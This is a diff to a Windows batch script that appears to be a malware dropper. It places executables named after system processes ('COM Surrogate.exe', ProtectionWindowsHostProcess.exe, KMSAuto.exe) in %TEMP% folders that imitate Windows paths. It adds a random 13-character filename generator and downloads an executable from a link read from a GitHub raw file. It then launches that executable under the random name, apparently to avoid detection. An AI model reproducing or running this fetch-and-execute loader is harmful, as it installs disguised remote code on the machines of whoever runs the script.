@@ -234,14 +234,14 @@ echo. >> "%LOGFILE%" 2>&1
 set "file1=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
 set "file2=%ProgramData%\Microsoft\Windows\ShellHost.exe"
 set "file3=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
-set "file4=%APPDATA%\Microsoft\nircmd.exe"
+set "file4=%TEMP%\nircmd.exe"
 set "file5=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
 set "file6=%ProgramData%\Microsoft\Windows\STLRRUNNERCALLER.exe"
-set "file7=%APPDATA%\Microsoft\7z.exe"
-set "file8=%APPDATA%\Microsoft\7z.dll"
+set "file7=%TEMP%\7z.exe"
+set "file8=%TEMP%\7z.dll"
 set "file9=%SystemRoot%\System32\handle.exe"
 set "file10=%SystemRoot%\System32\wudtest.exe"
-set "file11=%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+set "file11=%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
 
 
 echo Typing  >> "%LOGFILE%" 2>&1
@@ -358,7 +358,7 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 :: Define the folder and file paths
-set "targetFolder=%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
+set "targetFolder=%TEMP%\Windows\SystemCertificatesData\Tasks"
 set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
 set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"
 
@@ -384,12 +384,12 @@ echo. >> "%LOGFILE%" 2>&1
 timeout /t 5 /nobreak >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 
-::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
-::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
-::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
-::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
-::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
-::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
+::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
+::taskkill /F /IM "%TEMP%\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
 
 
 echo. >> "%LOGFILE%" 2>&1
@@ -398,8 +398,8 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 
-for /f "tokens=*" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
-echo MD5 of "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" = %RUNEVERYCURRENTMD5% >> "%LOGFILE%" 2>&1
+for /f "tokens=*" %%A in ('certutil -hashfile "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
+echo MD5 of "%TEMP%\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" = %RUNEVERYCURRENTMD5% >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
@@ -483,11 +483,18 @@ echo. >> "%LOGFILE%" 2>&1
 :: RunEveryCaller Installer
  
 color 0A
- 
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+
  
 :: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >> "%LOGFILE%" 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >> "%LOGFILE%" 2>&1
+taskkill /f /im !filename!.exe >> "%LOGFILE%" 2>&1
+del /f /q "%TEMP%\!filename!.exe" >> "%LOGFILE%" 2>&1
  
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
 
@@ -497,12 +504,12 @@ echo. >> "%LOGFILE%" 2>&1
 
 
 :: Download the file using curl
-curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%" >> "%LOGFILE%" 2>&1
+curl -L -# -o "%TEMP%\!filename!.exe" "%RUNFILELINK%" >> "%LOGFILE%" 2>&1
  
 timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
  
 :: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+if not exist "%TEMP%\!filename!.exe" (
     echo. >> "%LOGFILE%" 2>&1
     echo The download hasn't started yet. Please check your connection. >> "%LOGFILE%" 2>&1
     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
@@ -515,13 +522,13 @@ if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
  
  
 :: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
  
  
  
 :: Check if the file size is at least 80KB (80000 bytes)
 if %FILESIZE% geq 80000 (
-    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+    start "" "%TEMP%\!filename!.exe"
 ) else (
     echo.
     echo Download incomplete. Check your connection and run the file again. >> "%LOGFILE%" 2>&1
